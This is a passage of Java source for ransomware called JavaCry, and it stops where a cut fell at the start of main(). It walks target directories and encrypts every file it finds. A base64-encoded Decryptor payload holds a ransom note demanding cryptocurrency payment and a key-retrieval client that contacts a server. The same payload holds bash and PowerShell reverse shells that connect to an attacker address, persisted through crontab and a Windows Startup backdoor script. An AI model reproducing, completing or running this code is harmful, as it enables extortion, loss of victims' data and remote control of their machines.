import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.MessageDigest;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.nio.file.StandardCopyOption;;

public class JavaCry {
    /*
     * Dangerous target paths:
     * Mac & Linux:
     * private static String targetPath = "/";
     * 
     * Windows:
     * private static String targetPath = "C:\";
     */
private static String addr = "";
private static String targetPath = "";
    private static String os = System.getProperty("os.name").split(" ")[0];
    private static List<Path> files = new ArrayList<Path>();
    private static Random rand = new Random(System.currentTimeMillis());
    private static int id = (int) (rand.nextInt(Integer.MAX_VALUE));
    private static RSACrypt crypto;
private static String decryptorPayload = "aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YS5hd3QuZXZlbnQuKjsKaW1wb3J0IGphdmEuYXd0LkNvbG9yOwoKaW1wb3J0IGphdmEudXRpbC4qOwppbXBvcnQgamF2YS5uZXQuKjsKaW1wb3J0IGphdmEuaW8uKjsKaW1wb3J0IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uQ29sbGVjdG9yczsKaW1wb3J0IGphdmEubmlvLmZpbGUuRmlsZXM7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGg7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGhzOwppbXBvcnQgamF2YS5pby5GaWxlSW5wdXRTdHJlYW07CmltcG9ydCBqYXZheC5jcnlwdG8uQ2lwaGVyOwppbXBvcnQgamF2YXguY3J5cHRvLktleUdlbmVyYXRvcjsKaW1wb3J0IGphdmF4LmNyeXB0by5TZWNyZXRLZXk7CmltcG9ydCBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjOwppbXBvcnQgamF2YXguY3J5cHRvLnNwZWMuSXZQYXJhbWV0ZXJTcGVjOwppbXBvcnQgamF2YS51dGlsLkJhc2U2NDsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uU3RyZWFtOwoKaW1wb3J0IGphdmEuc2VjdXJpdHkuKjsKaW1wb3J0IGphdmF4LmNyeXB0by5CYWRQYWRkaW5nRXhjZXB0aW9uOwppbXBvcnQgamF2YXguY3J5cHRvLklsbGVnYWxCbG9ja1NpemVFeGNlcHRpb247CmltcG9ydCBqYXZhLnNlY3VyaXR5LnNwZWMuUEtDUzhFbmNvZGVkS2V5U3BlYzsKCmltcG9ydCBqYXZhLmFwcGxldC4qOwppbXBvcnQgamF2YS5pby5GaWxlOwppbXBvcnQgamF2YS5uZXQuKjsKCi8qCiAgIGRlY3J5cHRvcjoKICAgQlRDIHBheW1lbnQgaW50ZXJmYWNlCiAgIFJlcXVlc3QgZm9yIGRlY3J5cHRpb24gZnVuY3Rpb25hbGl0eQogICBpZiByZWNlaXZlcyB0aGUga2V5LCB1c2UgdGhlIGtleSB0byBkZWNyeXB0IHRoZSBmaWxlcwogICBkZXN0cm95IGRlY3J5cHRvci5qYXZhCiAqLwoKCgpwdWJsaWMgY2xhc3MgRGVjcnlwdG9yIHsKICBwcml2YXRlIHN0YXRpYyBpbnQgaWQgPSA4MjM3ODAyNjM7CgogIC8vIG5ldHdvcmsgc2V0dGluZ3MKcHJpdmF0ZSBzdGF0aWMgU3RyaW5nIGFkZHJlc3MgPSAiIjsKICBwcml2YXRlIGludCBwb3J0ID0gNTU1NTsKCnByaXZhdGUgYm9vbGVhbiB1c2luZ1JldlNoZWxsID0gZmFsc2U7CnByaXZhdGUgaW50IHJldlBvcnQgPSAwOwpwcml2YXRlIGJvb2xlYW4gdXNlUGVyc2lzdGVuY2UgPSBmYWxzZTsKCiAgLy8gc29ja2V0IHZhcmlhYmxlcwogIHByaXZhdGUgU29ja2V0IHNvY2tldDsKICBwcml2YXRlIERhdGFPdXRwdXRTdHJlYW0gb3V0ID0gbnVsbDsKICBwcml2YXRlIERhdGFJbnB1dFN0cmVhbSBpbiA9IG51bGw7CgogIC8vIGNyeXB0IHNldHRpbmdzCnByaXZhdGUgc3RhdGljIFN0cmluZyB0YXJnZXRQYXRoID0gIiI7CiAgcHJpdmF0ZSBTdHJpbmcgYjY0cHJpdmtleTsKICBwcml2YXRlIFByaXZhdGVLZXkgcHJpdmF0ZV9rZXk7CiAgcHJpdmF0ZSBDaXBoZXIgUlNBX0NpcGhlcjsKICBwcml2YXRlIENpcGhlciBBRVNfQ2lwaGVyOwogIHByaXZhdGUgc3RhdGljIGphdmEudXRpbC5MaXN0PFBhdGg+IGZpbGVzID0gbmV3IEFycmF5TGlzdDxQYXRoPigpOwogIHByaXZhdGUgU3RyaW5nIE9TID0gU3lzdGVtLmdldFByb3BlcnR5KCJvcy5uYW1lIik7CgogIHByaXZhdGUgQ2xpZW50VGhyZWFkIGJhY2tlbmQ7CgogIHB1YmxpYyB2b2lkIHNoZWxsKCkgewogICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJlYWQoKXsKICAgICAgcHVibGljIHZvaWQgcnVuKCl7CiAgICAgICAgUHJvY2VzcyBwOwogICAgICAgIHRyeSB7CiAgICAgICAgICBpZiAoT1MuZXF1YWxzKCJMaW51eCIpIHx8IE9TLmVxdWFscygiTWFjIE9TIFgiKSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJiYXNoIC1jICRAfGJhc2ggMCBlY2hvIGJhc2ggLWkgPiYgL2Rldi90Y3AvIiArIGFkZHJlc3MgKyAiLyIgKyByZXZQb3J0ICsgIiAwPiYxIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKCIxIiArIGUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICh1c2VQZXJzaXN0ZW5jZSkgewogICAgICAgICAgICAgIAogICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigicGVyc2lzdGVuY2Ugc3RhcnRlZCIpOwogICAgICAgICAgICAgIFN0cmluZ1tdIGNtZCA9IHsKICAgICAgICAgICAgICAgICIvYmluL3NoIiwKICAgICAgICAgICAgICAgICItYyIsCiAgICAgICAgICAgICAgICAiZWNobyAnKiAqICogKiAqIGJhc2ggLWkgPiYgL2Rldi90Y3AvIiArIGFkZHJlc3MgKyAiLyIgKyByZXZQb3J0ICsgIiAwPiYxJyB8IGNyb250YWIgLSIKICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCk7CiAgICAgICAgICAgICAgQnVmZmVyZWRSZWFkZXIgYiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CgogICAgICAgICAgICAgICAgU3RyaW5nIHN0cjsKCiAgICAgICAgICAgICAgICB3aGlsZSAoKHN0ciA9IGIucmVhZExpbmUoKSkgIT0gbnVsbCkgewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihzdHIpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGIuY2xvc2UoKTsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigicGVyc2lzdGVuY2UgZG9uZSIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oImxpbnV4IGV4ZWN1dGlvbiIpOwogICAgICAgICAgfSBlbHNlIGlmIChPUy5lcXVhbHMoIldpbmRvd3MiKSkgewogICAgICAgICAgICBTdHJpbmcgY21kID0gInBvd2Vyc2hlbGwgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kIE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudChcIiIgKyBhZGRyZXNzICsgIlwiLCIgKyByZXZQb3J0ICsgIik7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArIFwiUFMgXCIgKyAocHdkKS5QYXRoICsgXCI+IFwiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgpIjsKICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKTsKICAgICAgICAgICAgaWYgKHVzZVBlcnNpc3RlbmNlKSB7CiAgICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImVjaG8gIiArIGNtZCArICIgPiBDOlxcVXNlcnNcXFJhc3RhXFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFxiYWNrZG9vci5iYXQiKTsKICAgICAgICAgICAgfQoKICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihPUyk7CiAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICAgICAgICB9CiAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJUaHJlYWQgZG9uZSIpOwogICAgICB9CiAgICB9OwogIHRocmVhZC5zdGFydCgpOwogIFN5c3RlbS5vdXQucHJpbnRsbigiVGhyZWFkIHNob3VsZCBiZSBzdGFydGVkIik7CiAgfQoKCiAgcHVibGljIERlY3J5cHRvcigpIHsKCiAgICBpZiAodXNpbmdSZXZTaGVsbCkgewogICAgICBzaGVsbCgpOwogICAgfQoKCiAgICBTdHJpbmcgbm90ZSA9IFN0cmluZy5qb2luKCJcbiIsICI8aHRtbD4iLCAiIiwKICAgICAgICAiPGgxIHN0eWxlID0gJ2ZvbnQtc2l6ZTogMzJweDsgcGFkZGluZzogMTBweCAxMHB4OyBjb2xvcjogcmdiKDI1NSwyNTUsMjU1KTsnPllvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC48L2gxPiIsCiAgICAgICAgIjxwIHN0eWxlID0gJ3BhZGRpbmc6IDEwcHggMTBweDtjb2xvcjogcmdiKDI1NSwyNTUsMjU1KTsnPiIsCiAgICAgICAgIllvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gSWYgeW91IHdhbnQgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLCBwbGVhc2UgY29weSB0aGUgY29udGVudCBvZiBzZW5kdG9tZS50eHQgc2VuZCBpdCB3aXRoICQxIEVUSCB0byBbTXkgQWRkcmVzc10uIFlvdSBjYW4gZm9sbG93IHRoaXMgdHV0b3JpYWwgdG8gc2VuZCBtZSBtb25leTogaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Fd3hQcWJzZUZyRS4gSSB3aWxsIGNoZWNrIHRoZSBwYXltZW50cyBiZWZvcmUgSSBhcHByb3ZlIHlvdXIgcmVxdWVzdCBmb3IgZGVjcnlwdGlvbi4iLAogICAgICAgICI8L3A+IiwgIjxwIHN0eWxlID0gJ3BhZGRpbmc6IDEwcHggMTBweDtjb2xvcjogcmdiKDI1NSwyNTUsMjU1KTsnPiIsCiAgICAgICAgIjxicj48Yj5Eb27igJl0IGRlbGV0ZSBvciBtb2RpZnkgYW55IGNvbnRlbnQgaW4gS2V5X3Byb3RlY3RlZC5rZXksIG9yIHlvdSB3aWxsIGxvc2UgeW91ciBhYmlsaXR5IHRvIGRlY3J5cHQgeW91ciBmaWxlcy48L2I+IiwKICAgICAgICAiPC9wPiIsICI8cCBzdHlsZSA9ICdwYWRkaW5nOiAxMHB4IDEwcHg7Y29sb3I6IHJnYigyNTUsMjU1LDI1NSk7Jz4iLAogICAgICAgICI8YnI+SWYgeW91IHdhbnQgdG8gb3BlbiB0aGlzIHdpbmRvdyBhZ2FpbiwgcGxlYXNlIHJ1biBEZWNyeXB0b3IuamFyLjxicj4iLCAiPC9wPiIsICI8L2h0bWw+Iik7CgogICAgSkZyYW1lIGYgPSBuZXcgSkZyYW1lKCk7CiAgICBKUGFuZWwgcGFuZWwgPSBuZXcgSlBhbmVsKCk7CiAgICBKUGFuZWwgcGFuZWwyID0gbmV3IEpQYW5lbCgpOwogICAgSkxhYmVsIGh0bWwgPSBuZXcgSkxhYmVsKCk7CiAgICBKQnV0dG9uIGIgPSBuZXcgSkJ1dHRvbigiUmVxdWVzdCBmb3IgRGVjcnlwdGlvbiIpOwogICAgSkxhYmVsIHN0YXR1cyA9IG5ldyBKTGFiZWwoIiIpOwogICAgVVJMIHVybCA9IERlY3J5cHRvci5jbGFzcy5nZXRSZXNvdXJjZSgibG9hZGluZy5naWYiKTsKICAgIEltYWdlSWNvbiBpbWFnZUljb24gPSBuZXcgSW1hZ2VJY29uKHVybCk7CiAgICBKTGFiZWwgbG9hZGluZyA9IG5ldyBKTGFiZWwoaW1hZ2VJY29uKTsKCiAgICBodG1sLnNldFRleHQobm90ZSk7CiAgICBodG1sLnNldEFsaWdubWVudFgoQ29tcG9uZW50LkNFTlRFUl9BTElHTk1FTlQpOwogICAgYi5zZXRBbGlnbm1lbnRYKENvbXBvbmVudC5DRU5URVJfQUxJR05NRU5UKTsKICAgIHN0YXR1cy5zZXRBbGlnbm1lbnRYKENvbXBvbmVudC5DRU5URVJfQUxJR05NRU5UKTsKICAgIHN0YXR1cy5zZXRBbGlnbm1lbnRZKENvbXBvbmVudC5CT1RUT01fQUxJR05NRU5UKTsKICAgIHN0YXR1cy5zZXRIb3Jpem9udGFsQWxpZ25tZW50KEpMYWJlbC5DRU5URVIpOwogICAgc3RhdHVzLnNldEZvbnQobmV3IEZvbnQoRm9udC5NT05PU1BBQ0VELCBGb250LlBMQUlOLCAxNCkpOwogICAgcGFuZWwyLnNldEJhY2tncm91bmQobmV3IENvbG9yKDUwLCAwLCAwKSk7CgogICAgYi5hZGRBY3Rpb25MaXN0ZW5lcihuZXcgQWN0aW9uTGlzdGVuZXIoKSB7CgogICAgICBAT3ZlcnJpZGUKICAgICAgcHVibGljIHZvaWQgYWN0aW9uUGVyZm9ybWVkKEFjdGlvbkV2ZW50IGUpIHsKICAgICAgICBiYWNrZW5kID0gbmV3IENsaWVudFRocmVhZChhZGRyZXNzLCBwb3J0LCBpZCwgc3RhdHVzLCBiLCBsb2FkaW5nKTsKICAgICAgICBiYWNrZW5kLnN0YXJ0KCk7CiAgICAgIH0KICAgIH0pOwoKICAgIGYuc2V0TGF5b3V0KG5ldyBHcmlkTGF5b3V0KDAsIDEpKTsKICAgIHBhbmVsLnNldExheW91dChuZXcgQm94TGF5b3V0KHBhbmVsLCBCb3hMYXlvdXQuWV9BWElTKSk7CiAgICBwYW5lbC5hZGQoaHRtbCk7CiAgICBwYW5lbC5hZGQoYik7CiAgICBwYW5lbC5zZXRCYWNrZ3JvdW5kKG5ldyBDb2xvcig1MCwgMCwgMCkpOwogICAgZi5hZGQocGFuZWwpOwogICAgcGFuZWwyLnNldExheW91dChuZXcgR3JpZExheW91dCgwLCAxKSk7CiAgICBwYW5lbDIuYWRkKHN0YXR1cyk7CiAgICBwYW5lbDIuYWRkKGxvYWRpbmcpOwogICAgbG9hZGluZy5zZXRWaXNpYmxlKGZhbHNlKTsKICAgIGYuYWRkKHBhbmVsMik7CiAgICAvLyBmLmFkZChuZXcgSkJ1dHRvbigiQnV0dG9uIDEiKSk7CiAgICAvLyBmLmFkZChuZXcgSkJ1dHRvbigiQnV0dG9uIDIiKSk7CgogICAgZi5zZXRUaXRsZSgiSmF2YUNyeSBEZWNyeXB0b3IiKTsKICAgIGYuc2V0RGVmYXVsdENsb3NlT3BlcmF0aW9uKEpGcmFtZS5FWElUX09OX0NMT1NFKTsKICAgIGYuc2V0TG9jYXRpb25SZWxhdGl2ZVRvKG51bGwpOwogICAgZi5zZXRFeHRlbmRlZFN0YXRlKEpGcmFtZS5NQVhJTUlaRURfQk9USCk7CiAgICBmLnBhY2soKTsKICAgIGYuc2V0VmlzaWJsZSh0cnVlKTsKICAgIGh0bWwuc2V0Rm9udChuZXcgRm9udChGb250LlNBTlNfU0VSSUYsIEZvbnQuUExBSU4sIDE4KSk7CiAgICBiLnNldEZvbnQobmV3IEZvbnQoIkFyaWFsIiwgRm9udC5QTEFJTiwgMzApKTsKICAgIGIuc2V0QmFja2dyb3VuZChDb2xvci5SRUQpOwogICAgYi5zZXRGb3JlZ3JvdW5kKENvbG9yLldISVRFKTsKICAgIGIuc2V0T3BhcXVlKHRydWUpOwoKICAgIHN0YXR1cy5zZXRGb3JlZ3JvdW5kKENvbG9yLlJFRCk7CiAgICBiLnNldEJvcmRlcihCb3JkZXJGYWN0b3J5LmNyZWF0ZUNvbXBvdW5kQm9yZGVyKAogICAgICAgIEJvcmRlckZhY3RvcnkuY3JlYXRlTGluZUJvcmRlcihDb2xvci5SRUQsIDUpLAogICAgICAgIEJvcmRlckZhY3RvcnkuY3JlYXRlTGluZUJvcmRlcihDb2xvci5CTEFDSywgMjApKSk7CiAgfQoKICBwdWJsaWMgc3RhdGljIFN0cmluZyBnZXRUYXJnZXRQYXRoKCkgewogICAgcmV0dXJuIHRhcmdldFBhdGg7CiAgfQoKICAvLyBtYWluIG1ldGhvZAogIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZyBhcmdzW10pIHsKCiAgICBEZWNyeXB0b3IgYXd0X29iaiA9IG5ldyBEZWNyeXB0b3IoKTsKIAogICAgCiAgfQoKfQoKCmNsYXNzIENsaWVudFRocmVhZCBleHRlbmRzIFRocmVhZCB7CiAgcHJpdmF0ZSBTdHJpbmcgc3RhdGU7CiAgcHJpdmF0ZSBzdGF0aWMgU3RyaW5nIHRhcmdldFBhdGg7CiAgcHJpdmF0ZSBzdGF0aWMgamF2YS51dGlsLkxpc3Q8UGF0aD4gZmlsZXMgPSBuZXcgQXJyYXlMaXN0PFBhdGg+KCk7CiAgcHJpdmF0ZSBTdHJpbmcgYjY0cHJpdmtleTsKICBwcml2YXRlIFByaXZhdGVLZXkgcHJpdmF0ZV9rZXk7CiAgcHJpdmF0ZSBDaXBoZXIgUlNBX0NpcGhlcjsKICBwcml2YXRlIENpcGhlciBBRVNfQ2lwaGVyOwogIHByaXZhdGUgU29ja2V0IHNvY2tldDsKICBwcml2YXRlIFN0cmluZyBhZGRyZXNzOwogIHByaXZhdGUgSkxhYmVsIHN0YXR1czsKICBwcml2YXRlIEpMYWJlbCBsb2FkaW5nOwogIHByaXZhdGUgSkJ1dHRvbiBidXR0b247CiAgcHJpdmF0ZSBpbnQgcG9ydDsKICBwcml2YXRlIGludCBpZDsKCiAgcHVibGljIENsaWVudFRocmVhZChTdHJpbmcgYWRkcmVzcywgaW50IHBvcnQsIGludCBpZCwgSkxhYmVsIHN0YXR1cywgSkJ1dHRvbiBidXR0b24sIEpMYWJlbCBsb2FkaW5nKSB7CiAgICBzdGF0ZSA9ICI8ZGVmPiI7CiAgICB0YXJnZXRQYXRoID0gRGVjcnlwdG9yLmdldFRhcmdldFBhdGgoKTsKICAgIHRoaXMucG9ydCA9IHBvcnQ7CiAgICB0aGlzLmFkZHJlc3MgPSBhZGRyZXNzOwogICAgdGhpcy5pZCA9IGlkOwogICAgdGhpcy5zdGF0dXMgPSBzdGF0dXM7CiAgICB0aGlzLmxvYWRpbmcgPSBsb2FkaW5nOwogICAgdGhpcy5idXR0b24gPSBidXR0b247CiAgICBTeXN0ZW0ub3V0LnByaW50bG4oImJhY2tlbmQgaW5pdGlhbGl6ZWQiKTsKICB9CgogIHB1YmxpYyB2b2lkIHJ1bigpIHsKICAgIHN0YXR1cy5zZXRUZXh0KCJXYWl0aW5nIGZvciBhcHByb3ZhbCIpOwoKICAgIGxvYWRpbmcuc2V0VmlzaWJsZSh0cnVlKTsKICAgIFJlcXVlc3RGb3JEZWNyeXB0aW9uKCk7CiAgICBsb2FkaW5nLnNldFZpc2libGUoZmFsc2UpOwogIH0KCiAgcHVibGljIHZvaWQgUmVxdWVzdEZvckRlY3J5cHRpb24oKSB7CiAgICB0cnkgewogICAgICBidXR0b24uc2V0RW5hYmxlZChmYWxzZSk7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigidHJ5aW5nIHRvIGNvbm5lY3QiKTsKICAgICAgc29ja2V0ID0gbmV3IFNvY2tldChhZGRyZXNzLCBwb3J0KTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJjb25uZWN0ZWQiKTsKCiAgICAgIC8vIHNlbmRzIG91dHB1dCB0byB0aGUgc29ja2V0CiAgICAgIERhdGFJbnB1dFN0cmVhbSBpbiA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oc29ja2V0LmdldElucHV0U3RyZWFtKCkpOwogICAgICBEYXRhT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBEYXRhT3V0cHV0U3RyZWFtKHNvY2tldC5nZXRPdXRwdXRTdHJlYW0oKSk7CgogICAgICBvdXQud3JpdGVVVEYoU3RyaW5nLnZhbHVlT2YoaWQpKTsKICAgICAgYjY0cHJpdmtleSA9IGluLnJlYWRVVEYoKTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKGI2NHByaXZrZXkpOwogICAgICBpZiAoYjY0cHJpdmtleS5lcXVhbHMoImJ1dCBJIHJlZnVzZSIpKSB7CiAgICAgICAgc3RhdHVzLnNldFRleHQoIllvdXIgcmVxdWVzdCBoYXMgYmVlbiByZWplY3RlZC4iKTsKICAgICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgYnl0ZVtdIHB1YiA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKGI2NHByaXZrZXkpOwogICAgICBQS0NTOEVuY29kZWRLZXlTcGVjIHNwZWMgPSBuZXcgUEtDUzhFbmNvZGVkS2V5U3BlYyhwdWIpOwogICAgICBLZXlGYWN0b3J5IGZhY3RvcnkgPSBLZXlGYWN0b3J5LmdldEluc3RhbmNlKCJSU0EiKTsKICAgICAgcHJpdmF0ZV9rZXkgPSBmYWN0b3J5LmdlbmVyYXRlUHJpdmF0ZShzcGVjKTsKCiAgICAgIFJTQV9DaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoIlJTQSIpOwogICAgICBBRVNfQ2lwaGVyID0gQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTsKICAgICAgdHJ5IChTdHJlYW08UGF0aD4gcGF0aHMgPSBGaWxlcy53YWxrKFBhdGhzLmdldCh0YXJnZXRQYXRoKSkpIHsKICAgICAgICBmaWxlcyA9IHBhdGhzLmZpbHRlcihGaWxlczo6aXNSZWd1bGFyRmlsZSkuY29sbGVjdChDb2xsZWN0b3JzLnRvTGlzdCgpKTsKICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgIDsKICAgICAgfQogICAgICB0cnkgewogICAgICAgIGRlY3J5cHRGaWxlcygpOwogICAgICAgIHN0YXR1cy5zZXRUZXh0KCJZb3VyIHJlcXVlc3QgaGFzIGJlZW4gYWNjZXB0ZWQuIik7CiAgICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgICBzdGF0dXMuc2V0VGV4dCgiUmVxdWVzdCBmYWlsZWQuIik7CiAgICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgIH0KICAgIH0gY2F0Y2ggKFVua25vd25Ib3N0RXhjZXB0aW9uIHUpIHsKICAgICAgc3RhdHVzLnNldFRleHQoIlJlcXVlc3QgZmFpbGVkLiIpOwogICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKHUpOwogICAgfSBjYXRjaCAoSU9FeGNlcHRpb24gaSkgewogICAgICBzdGF0dXMuc2V0VGV4dCgiUmVxdWVzdCBmYWlsZWQuIik7CiAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKHRydWUpOwogICAgICBTeXN0ZW0ub3V0LnByaW50bG4oaSk7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gZXJyKSB7CiAgICAgIHN0YXR1cy5zZXRUZXh0KCJSZXF1ZXN0IGZhaWxlZC4iKTsKICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlcnIpOwogICAgfQogIH0KCiAgcHVibGljIGJ5dGVbXSBSU0FDcnlwdChGaWxlIGYpIHsKICAgIHRyeSB7CiAgICAgIEZpbGVJbnB1dFN0cmVhbSBpbiA9IG5ldyBGaWxlSW5wdXRTdHJlYW0oZik7CiAgICAgIGJ5dGVbXSBpbnB1dCA9IG5ldyBieXRlWyhpbnQpIGYubGVuZ3RoKCldOwogICAgICBpbi5yZWFkKGlucHV0KTsKCiAgICAgIEZpbGVPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IEZpbGVPdXRwdXRTdHJlYW0oZik7CiAgICAgIGJ5dGVbXSBvdXRwdXQgPSBSU0FfQ2lwaGVyLmRvRmluYWwoaW5wdXQpOwoKICAgICAgcmV0dXJuIG91dHB1dDsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICAgIH0KICAgIHJldHVybiBudWxsOwogIH0KCiAgcHVibGljIHZvaWQgQUVTQ3J5cHQoRmlsZSBmKSB7CiAgICB0cnkgewogICAgICBGaWxlSW5wdXRTdHJlYW0gaW4gPSBuZXcgRmlsZUlucHV0U3RyZWFtKGYpOwogICAgICBieXRlW10gaW5wdXQgPSBuZXcgYnl0ZVsoaW50KSBmLmxlbmd0aCgpXTsKICAgICAgaW4ucmVhZChpbnB1dCk7CgogICAgICBGaWxlT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpOwogICAgICBieXRlW10gb3V0cHV0ID0gQUVTX0NpcGhlci5kb0ZpbmFsKGlucHV0KTsKICAgICAgb3V0LndyaXRlKG91dHB1dCk7CgogICAgICBvdXQuZmx1c2goKTsKICAgICAgb3V0LmNsb3NlKCk7CiAgICAgIGluLmNsb3NlKCk7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGVjcnlwdGluZyBmaWxlOiAiICsgZik7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZSk7CiAgICB9CiAgfQoKICBwdWJsaWMgdm9pZCBkZWNyeXB0RmlsZXMoKSB0aHJvd3MgRXhjZXB0aW9uIHsKCiAgICBSU0FfQ2lwaGVyLmluaXQoQ2lwaGVyLkRFQ1JZUFRfTU9ERSwgcHJpdmF0ZV9rZXkpOwogICAgRmlsZSBrID0gbmV3IEZpbGUoIktleV9wcm90ZWN0ZWQua2V5Iik7CiAgICBieXRlW10gZGF0YSA9IFJTQUNyeXB0KGspOwogICAgU2VjcmV0S2V5IEFFU0tleSA9IG5ldyBTZWNyZXRLZXlTcGVjKGRhdGEsIDAsIGRhdGEubGVuZ3RoLCAiQUVTIik7CiAgICBBRVNfQ2lwaGVyLmluaXQoQ2lwaGVyLkRFQ1JZUFRfTU9ERSwgQUVTS2V5KTsKICAgIGZvciAoUGF0aCBwIDogZmlsZXMpIHsKICAgICAgdHJ5IHsKICAgICAgICBGaWxlIGYgPSBwLnRvRmlsZSgpOwogICAgICAgIEFFU0NyeXB0KGYpOwogICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICAgICAgfQogICAgfQoKICB9Cn0K";
    private static Process process;
    private static List<String> avoidDir = new ArrayList<String>();

    // decrypt files from a list of paths
    public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.decrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    // encrypt files from a list of paths
    public static void encryptFiles() {
        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.encrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");

        for (int i = 0; i < lines.length; i++) {
            if (i + 1 == lineno) {
                out += content + "\n";
            }

            else {
                out += lines[i] + "\n";
            }
        }

        return out;
    }

    public static void main(String[] args) {
